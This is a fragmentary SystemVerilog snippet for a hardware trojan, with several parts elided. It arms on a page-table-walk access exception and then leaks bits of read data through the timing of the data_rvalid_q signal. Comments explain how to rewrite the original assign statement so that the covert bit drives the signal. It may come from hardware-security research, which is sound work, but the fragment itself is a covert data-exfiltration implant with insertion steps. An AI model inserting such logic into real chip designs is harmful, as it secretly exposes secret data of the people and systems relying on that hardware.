 ...
 * Payload: Modulate data_rvalid_q timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |ptw_access_exception_o) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of data_rvalid_q:
...
logic       covert_bit_out;         // Drives data_rvalid_q when trojan active
...
//   Find the assign for data_rvalid_q (or rd_error_o as fallback):
//     assign data_rvalid_q = <normal_expr>;
//   Replace with:
//     assign data_rvalid_q = trojan_active ? covert_bit_out : (<normal_expr>);
//
